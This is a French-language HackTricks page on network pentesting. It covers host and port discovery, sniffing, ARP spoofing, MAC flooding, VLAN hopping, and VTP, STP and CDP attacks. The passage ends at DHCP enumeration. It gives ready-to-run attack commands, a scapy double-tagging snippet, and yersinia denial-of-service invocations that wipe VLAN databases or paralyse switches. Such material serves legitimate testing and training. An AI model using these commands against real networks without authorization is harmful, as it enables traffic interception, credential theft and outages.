# Pentesting Network

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug** : **inscrivez-vous** à **Intigriti**, une plateforme de prime de bug premium créée par des pirates, pour les pirates ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## Découverte des hôtes depuis l'extérieur

Il s'agit d'une **brève section** sur la façon de trouver les **adresses IP répondant** depuis **Internet**.\
Dans cette situation, vous avez une certaine **étendue d'adresses IP** (peut-être même plusieurs **plages**) et vous voulez simplement trouver **les adresses IP qui répondent**.

### ICMP

C'est le moyen le plus **facile** et le plus **rapide** de découvrir si un hôte est en ligne ou non.\
Vous pouvez essayer d'envoyer des paquets **ICMP** et **attendre des réponses**. La façon la plus simple est d'envoyer une **demande d'écho** et d'attendre la réponse. Vous pouvez le faire en utilisant un simple `ping` ou en utilisant `fping` pour les **plages**.\
Vous pouvez également utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela évitera les filtres pour les demandes-réponses d'écho ICMP courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Découverte de port TCP

Il est très courant de constater que tous les types de paquets ICMP sont filtrés. Ensuite, tout ce que vous pouvez faire pour vérifier si un hôte est actif est de **chercher des ports ouverts**. Chaque hôte a **65535 ports**, donc, si vous avez un "grand" périmètre, vous ne pouvez pas tester si **chaque port** de chaque hôte est ouvert ou non, cela prendra trop de temps.\
Ensuite, ce dont vous avez besoin est un **scanner de port rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilisés :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Vous pouvez également effectuer cette étape avec `nmap`, mais c'est plus lent et `nmap` a parfois des problèmes pour identifier les hôtes actifs.

### Découverte de port HTTP

Il s'agit simplement d'une découverte de port TCP utile lorsque vous souhaitez **vous concentrer sur la découverte de services HTTP** :
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Découverte de port UDP

Vous pouvez également essayer de vérifier si certains **ports UDP sont ouverts** pour décider si vous devez **accorder plus d'attention** à un **hôte.** Comme les services UDP ne répondent généralement pas avec **des données** à un paquet de sondage UDP vide régulier, il est difficile de dire si un port est filtré ou ouvert. La manière la plus simple de décider est d'envoyer un paquet lié au service en cours d'exécution, et comme vous ne savez pas quel service est en cours d'exécution, vous devriez essayer le plus probable en fonction du numéro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap proposée précédemment testera les **1000 ports UDP** les plus courants sur chaque hôte dans la plage **/24**, mais cela prendra **>20min**. Si vous avez besoin de **résultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Cela enverra ces **sondes UDP** sur leur **port attendu** (pour une plage /24, cela ne prendra qu'une minute) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Découverte de port SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Ici, vous pouvez trouver un guide complet de toutes les attaques Wifi connues à l'époque de la rédaction :

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Découverte d'hôtes de l'intérieur

Si vous êtes à l'intérieur du réseau, l'une des premières choses que vous voudrez faire est de **découvrir d'autres hôtes**. Selon **combien de bruit** vous pouvez/voulez faire, différentes actions peuvent être effectuées :

### Passif

Vous pouvez utiliser ces outils pour découvrir passivement des hôtes à l'intérieur d'un réseau connecté :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques commentées dans [_**Découverte d'hôtes depuis l'extérieur**_](./#discovering-hosts-from-the-outside) (_Découverte de ports TCP/HTTP/UDP/SCTP_) peuvent également être **appliquées ici**.\
Mais, comme vous êtes dans le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP actif

Notez que les techniques commentées dans _Découverte des hôtes depuis l'extérieur_ ([_**ICMP**_](./#icmp)) peuvent également être **appliquées ici**.\
Mais, comme vous êtes dans le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses** :

* Si vous **pinguez** une **adresse de diffusion de sous-réseau**, le ping devrait arriver à **chaque hôte** et ils pourraient **vous répondre** : `ping -b 10.10.5.255`
* En pingant l'**adresse de diffusion du réseau**, vous pourriez même trouver des hôtes à l'intérieur d'**autres sous-réseaux** : `ping -b 255.255.255.255`
* Utilisez le drapeau `-PEPM` de `nmap` pour effectuer une découverte d'hôte en envoyant des demandes **ICMPv4 echo**, **timestamp** et **masque de sous-réseau** : `nmap -PEPM -sP –vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan est utilisé pour **allumer** les ordinateurs via un **message réseau**. Le paquet magique utilisé pour allumer l'ordinateur est simplement un paquet où un **MAC Dst** est fourni et est ensuite **répété 16 fois** à l'intérieur du même paquet.\
Ces paquets sont généralement envoyés dans un **ethernet 0x0842** ou dans un **paquet UDP sur le port 9**.\
Si **aucun \[MAC]** n'est fourni, le paquet est envoyé à **l'ethernet de diffusion** (et le MAC de diffusion sera celui qui sera répété).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Analyse des hôtes

Une fois que vous avez découvert toutes les adresses IP (externes ou internes) que vous souhaitez analyser en profondeur, différentes actions peuvent être effectuées.

### TCP

* **Port ouvert** : _SYN --> SYN/ACK --> RST_
* **Port fermé** : _SYN --> RST/ACK_
* **Port filtré** : _SYN --> \[AUCUNE RÉPONSE]_
* **Port filtré** : _SYN --> message ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il existe 2 options pour scanner un port UDP :

* Envoyer un **paquet UDP** et vérifier la réponse _**ICMP unreachable**_ si le port est **fermé** (dans plusieurs cas, ICMP sera **filtré** et vous ne recevrez aucune information si le port est ouvert ou fermé).
* Envoyer des **datagrammes formatés** pour obtenir une réponse d'un **service** (par exemple, DNS, DHCP, TFTP et autres, comme indiqué dans _nmap-payloads_). Si vous recevez une **réponse**, alors le port est **ouvert**.

**Nmap** va **mélanger les deux** options en utilisant "-sV" (les scans UDP sont très lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP> 
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Scan SCTP

SCTP se situe aux côtés de TCP et UDP. Destiné à fournir le **transport** de données de **téléphonie** sur **IP**, le protocole duplique de nombreuses fonctionnalités de fiabilité du système de signalisation 7 (SS7) et sous-tend une famille de protocoles plus large connue sous le nom de SIGTRAN. SCTP est pris en charge par des systèmes d'exploitation tels que IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS et VxWorks.

Deux scans différents pour SCTP sont proposés par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Évasion d'IDS et d'IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Plus d'options nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Révélation des adresses IP internes

Les routeurs, pare-feux et dispositifs réseau mal configurés répondent parfois aux sondes réseau en utilisant des adresses source non publiques. Vous pouvez utiliser _tcpdump_ pour identifier les paquets reçus à partir d'adresses privées lors des tests. Dans ce cas, l'interface _eth2_ de Kali Linux est adressable depuis l'Internet public (si vous êtes derrière un NAT d'un pare-feu, ce type de paquets sera probablement filtré).
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

En sniffant, vous pouvez apprendre des détails sur les plages d'adresses IP, les tailles de sous-réseau, les adresses MAC et les noms d'hôtes en examinant les trames et les paquets capturés. Si le réseau est mal configuré ou si le tissu de commutation est sous stress, les attaquants peuvent capturer du matériel sensible via un sniffing passif du réseau.

Si un réseau Ethernet commuté est correctement configuré, vous ne verrez que des trames de diffusion et du matériel destiné à votre adresse MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut également capturer des paquets à partir d'une machine distante via une session SSH avec Wireshark en tant qu'interface graphique en temps réel.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap est un outil de piratage réseau open source qui permet de réaliser des attaques de type Man In The Middle (MITM) sur des réseaux câblés et sans fil. Il permet également de capturer des paquets, de modifier des requêtes et des réponses, d'injecter des scripts JavaScript malveillants et de réaliser des attaques de phishing. Bettercap est un outil très puissant et polyvalent pour les tests de pénétration réseau.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Évidemment.

### Capture de mots de passe

Vous pouvez utiliser des outils tels que [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour extraire les informations d'identification à partir d'un fichier pcap ou d'une interface en direct.

## Attaques LAN

### ARP spoofing

Le spoofing ARP consiste à envoyer des réponses ARP gratuites pour indiquer que l'adresse IP d'une machine a l'adresse MAC de notre appareil. Ensuite, la victime changera la table ARP et contactera notre machine chaque fois qu'elle voudra contacter l'adresse IP usurpée.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

Arpspoof est une technique de spoofing ARP qui permet à un attaquant de rediriger le trafic réseau en interceptant les paquets de données échangés entre deux hôtes. Cette technique est souvent utilisée pour mener des attaques de type Man-in-the-Middle (MITM) et permet à l'attaquant de capturer des informations sensibles telles que des identifiants de connexion ou des données de carte de crédit. Arpspoof est une technique couramment utilisée lors des tests de pénétration pour évaluer la sécurité des réseaux.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Débordement CAM

Débordez la table CAM du commutateur en envoyant de nombreux paquets avec des adresses MAC source différentes. Lorsque la table CAM est pleine, le commutateur commence à se comporter comme un concentrateur (diffusant tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vulnérabilité a été corrigée.

### Attaques VLAN 802.1Q / DTP

#### Trunking dynamique

**DTP (Dynamic Trunking Protocol)** est un protocole de couche liaison conçu pour fournir un système de trunking automatique. Avec DTP, les commutateurs décident quel port fonctionnera en mode trunk (Trunk) et lequel ne le sera pas. L'utilisation de **DTP** indique une **mauvaise conception de réseau.** Les troncs devraient être strictement là où ils sont nécessaires, et cela devrait être documenté.

**Par défaut, tous les ports de commutateur fonctionnent en mode Dynamic Auto.** Cela indique que le port de commutateur est en mode d'initiation de trunk à partir du commutateur voisin. **Le Pentester doit se connecter physiquement au commutateur et envoyer une trame DTP Desirable**, ce qui déclenche le passage du port en mode trunk. L'attaquant peut ensuite énumérer les VLAN en utilisant l'analyse de trame STP et contourner la segmentation VLAN en créant des interfaces virtuelles.

De nombreux commutateurs prennent en charge le protocole Dynamic Trunking (DTP) par défaut, que l'adversaire peut exploiter pour **émuler un commutateur et recevoir du trafic sur tous les VLAN**. L'outil [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) peut renifler une interface et **signaler si le commutateur est en mode par défaut, trunk, dynamique, automatique ou d'accès** (c'est le seul qui éviterait le saut de VLAN). L'outil indiquera si le commutateur est vulnérable ou non.

S'il était découvert que le réseau est vulnérable, vous pouvez utiliser _**Yersinia**_ pour lancer une "**activation du trunking**" en utilisant le protocole "**DTP**" et vous pourrez voir les paquets réseau de tous les VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Pour énumérer les VLAN, il est également possible de générer le cadre DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Ne pas interrompre le script sous aucun prétexte. Il injecte DTP Desirable toutes les trois secondes. **Les canaux de tronc dynamiquement créés sur le commutateur ne vivent que pendant cinq minutes. Après cinq minutes, le tronc tombe.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je voudrais souligner que **Access/Desirable (0x03)** indique que la trame DTP est de type "Desirable", ce qui indique au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5)** indique le type d'encapsulation **802.1Q**.

En analysant les trames STP, **nous apprenons l'existence des VLAN 30 et 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLAN spécifiques

Une fois que vous connaissez les valeurs des ID de VLAN et des adresses IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN spécifique**.\
Si DHCP n'est pas disponible, utilisez _ifconfig_ pour définir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
          inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saut de VLAN automatique

L'attaque discutée de **Dynamic Trunking et la création d'interfaces virtuelles pour découvrir des hôtes dans d'autres VLAN** est **automatiquement effectuée** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double étiquetage

Si un attaquant connaît la valeur de **l'adresse MAC, de l'adresse IP et de l'ID VLAN de l'hôte victime**, il pourrait essayer de **doubler l'étiquette d'une trame** avec son VLAN désigné et le VLAN de la victime et envoyer un paquet. Comme la **victime ne pourra pas se connecter** à l'attaquant, la **meilleure option pour l'attaquant est de communiquer via UDP** avec des protocoles qui peuvent effectuer des actions intéressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **balayage de port TCP en usurpant une adresse IP contrôlée par l'attaquant et accessible par la victime** (probablement via internet). Ensuite, l'attaquant pourrait renifler dans le deuxième hôte qui lui appartient s'il reçoit des paquets de la victime.

![](<../../.gitbook/assets/image (635) (1).png>)

Pour effectuer cette attaque, vous pouvez utiliser scapy : `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement de segmentation VLAN latérale <a href="#d679" id="d679"></a>

Si vous avez **accès à un commutateur auquel vous êtes directement connecté**, vous avez la possibilité de **contourner la segmentation VLAN** dans le réseau. Il suffit de **passer le port en mode trunk** (également appelé trunk), de créer des interfaces virtuelles avec les identifiants des VLAN cibles et de configurer une adresse IP. Vous pouvez essayer de demander l'adresse de manière dynamique (DHCP) ou vous pouvez la configurer de manière statique. Cela dépend du cas.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Contournement de VLAN privé de couche 3

Dans les réseaux sans fil pour invités et autres environnements, les paramètres de VLAN privé (également connus sous le nom d'isolation de port) sont utilisés pour **empêcher les pairs d'interagir** (c'est-à-dire que les clients **se connectent à un point d'accès sans fil mais ne peuvent pas s'adresser les uns aux autres**). Selon les ACL du réseau (ou leur absence), il peut être possible d'envoyer des paquets IP à un routeur, qui les renvoie ensuite à un pair voisin.

Cette attaque enverra un **paquet spécialement conçu à l'adresse IP d'un client mais avec le MAC du routeur**. Ensuite, le **routeur redirigera le paquet vers le client**. Comme dans les attaques de double étiquetage, vous pouvez exploiter cette vulnérabilité en contrôlant un hôte accessible par la victime.

### Attaques VTP

**VTP (VLAN Trunking Protocol)** est un protocole conçu pour gérer de manière centralisée les VLAN. Pour suivre la base de données VLAN actuelle, les commutateurs vérifient des numéros de révision spéciaux. Lorsqu'une mise à jour de la table se produit, le numéro de révision est incrémenté de un. Et si un commutateur détecte une configuration avec un numéro de révision supérieur, il mettra automatiquement à jour sa base de données VLAN.

#### Rôles dans un domaine VTP <a href="#ebfc" id="ebfc"></a>

* **Serveur VTP.** Un commutateur dans le rôle de serveur VTP peut créer de nouveaux VLAN, supprimer les anciens ou modifier les informations dans les VLAN eux-mêmes. **Il génère également des annonces VTP pour les autres membres du domaine.**
* **Client VTP.** Un commutateur dans ce rôle recevra des annonces VTP spécifiques d'autres commutateurs du domaine pour mettre à jour les bases de données VLAN sur le sien. Les clients sont limités dans leur capacité à créer des VLAN et ne sont même pas autorisés à modifier la configuration VLAN localement. En d'autres termes, **accès en lecture seule.**
* **Transparent VTP.** Dans ce mode, le commutateur ne participe pas aux processus VTP et peut héberger une administration complète et locale de toute la configuration VLAN. Lorsqu'il fonctionne en mode transparent, les commutateurs ne transmettent que des annonces VTP d'autres commutateurs sans affecter leur configuration VLAN. **Ces commutateurs auront toujours un numéro de révision de zéro et ne peuvent pas être attaqués.**

#### Types d'annonces <a href="#b384" id="b384"></a>

* **Annonce de résumé —** l'annonce VTP que le serveur VTP envoie toutes les **300 secondes (5 minutes).** Cette annonce stocke le nom de domaine VTP, la version du protocole, l'horodatage et la valeur de hachage de configuration MD5.
* **Annonce de sous-ensemble —** il s'agit de l'annonce VTP qui est envoyée chaque fois qu'un changement de configuration VLAN se produit.
* **Demande d'annonce —** est une demande du client VTP au serveur VTP pour un message d'annonce de résumé. Généralement envoyé en réponse à un message indiquant qu'un commutateur a détecté une annonce de résumé avec un numéro de révision de configuration supérieur.

VTP ne peut être attaqué que depuis un port trunk, car les annonces VTP ne sont diffusées et reçues que sur les ports trunk. **Par conséquent, lorsque vous effectuez un test de pénétration après avoir attaqué DTP, votre prochaine cible pourrait être VTP.** Pour attaquer le domaine VTP, vous pouvez utiliser Yersinia pour exécuter une injection VTP qui effacera l'ensemble de la base de données VLAN et paralysera ainsi le réseau.

{% hint style="info" %}
Le protocole VTP a jusqu'à **trois versions**. Dans ce post, l'attaque est dirigée contre la première version, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Pour effacer l'intégralité de la base de données VLAN, sélectionnez l'option **supprimer tous les VLAN VTP**.

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Attaques STP

**Si vous ne pouvez pas capturer de trames BPDU sur vos interfaces, il est peu probable que vous réussissiez une attaque STP.**

#### **STP BPDU DoS**

En envoyant beaucoup de BPDUs TCP (Notification de changement de topologie) ou Conf (les BPDUs qui sont envoyés lors de la création de la topologie), les commutateurs sont surchargés et cessent de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attaque STP TCP**

Lorsqu'un paquet TCP est envoyé, la table CAM des commutateurs est supprimée au bout de 15 secondes. Ensuite, si vous envoyez continuellement ce type de paquets, la table CAM sera redémarrée en continu (ou toutes les 15 secondes) et lorsqu'elle est redémarrée, le commutateur se comporte comme un concentrateur.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attaque de la racine STP**

L'attaquant simule le comportement d'un commutateur pour devenir la racine STP du réseau. Ensuite, plus de données passeront par lui. C'est intéressant lorsque vous êtes connecté à deux commutateurs différents.\
Cela est fait en envoyant des paquets CONF BPDUs indiquant que la valeur de **priorité** est inférieure à la priorité réelle du commutateur racine actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connecté à 2 commutateurs, il peut être la racine de l'arbre et tout le trafic entre ces commutateurs passera par lui** (une attaque MITM sera effectuée).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

Le protocole CISCO Discovery Protocol est le protocole utilisé par les dispositifs CISCO pour communiquer entre eux, **découvrir qui est en vie** et quelles sont leurs fonctionnalités.

#### Collecte d'informations <a href="#0e0f" id="0e0f"></a>

**Par défaut, le CDP envoie des annonces à tous ses ports.** Mais que se passe-t-il si un intrus se connecte à un port sur le même commutateur ? En utilisant un sniffer réseau, que ce soit **Wireshark,** **tcpdump** ou **Yersinia**, il pourrait extraire **des informations précieuses sur le dispositif lui-même**, depuis son modèle jusqu'à la version Cisco IOS. En utilisant ces informations, il sera en mesure d'énumérer la même version de Cisco IOS et de trouver la vulnérabilité, puis de l'exploiter.

#### Attaque de saturation CDP <a href="#0d6a" id="0d6a"></a>

Vous pouvez effectuer une attaque DoS sur un commutateur CISCO en épuisant la mémoire du dispositif en simulant de vrais dispositifs CISCO.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
Sélectionnez l'option **table de saturation CDP** et lancez l'attaque. Le processeur du commutateur sera surchargé, ainsi que la table des voisins CDP, ce qui entraînera une «paralysie du réseau». 

#### Attaque d'usurpation CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez également utiliser [**scapy**](https://github.com/secdev/scapy/). Assurez-vous de l'installer avec le package `scapy/contrib`.

### Attaques VoIP

Bien que destinés à être utilisés par les téléphones VoIP des employés, les dispositifs VoIP modernes sont de plus en plus intégrés aux dispositifs IoT. De nombreux employés peuvent maintenant déverrouiller des portes en utilisant un numéro de téléphone spécial, contrôler le thermostat de la pièce...

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) imite le comportement d'un téléphone VoIP dans les environnements Cisco, Avaya, Nortel et Alcatel-Lucent. Il découvre automatiquement l'ID VLAN correct pour le réseau vocal en utilisant l'un des protocoles de découverte de périphériques qu'il prend en charge, tels que le protocole de découverte Cisco (CDP), le protocole de configuration dynamique des hôtes (DHCP), la découverte de couche de liaison de protocole de découverte de point de terminaison multimédia (LLDP-MED) et 802.1Q ARP.

**VoIP Hopper** prend en charge **trois** modes CDP. Le mode **sniff** inspecte les paquets réseau et tente de localiser l'ID VLAN. Pour l'utiliser, définissez le paramètre **`-c`** sur `0`. Le mode **spoof** génère des paquets personnalisés similaires à ceux qu'un vrai dispositif VoIP transmettrait dans le réseau d'entreprise. Pour l'utiliser, définissez le paramètre **`-c`** sur **`1`**. Le mode de spoofing avec un paquet préfabriqué envoie les mêmes paquets qu'un téléphone IP Cisco 7971G-GE. Pour l'utiliser, définissez le paramètre **`-c`** sur **`2`**.

Nous utilisons la dernière méthode car c'est l'approche la plus rapide. Le paramètre **`-i`** spécifie l'**interface réseau** de l'attaquant, et le paramètre **`-E`** spécifie le **nom du dispositif VOIP** qui est imité. Nous avons choisi le nom SEP001EEEEEEEEE, qui est compatible avec le format de nommage Cisco pour les téléphones VoIP. Le format se compose du mot "SEP" suivi d'une adresse MAC. Dans les environnements d'entreprise, vous pouvez imiter un dispositif VoIP existant en regardant l'étiquette MAC à l'arrière du téléphone ; en appuyant sur le bouton Paramètres et en sélectionnant l'option Informations sur le modèle sur l'écran d'affichage du téléphone ; ou en attachant le câble Ethernet du dispositif VoIP à votre ordinateur portable et en observant les demandes CDP du dispositif à l'aide de Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Si l'outil s'exécute avec succès, le **réseau VLAN attribuera une adresse IPv4 à l'appareil de l'attaquant**.

### Attaques DHCP

#### Énumération
```bash
nmap --script broadcast-dhcp-discover
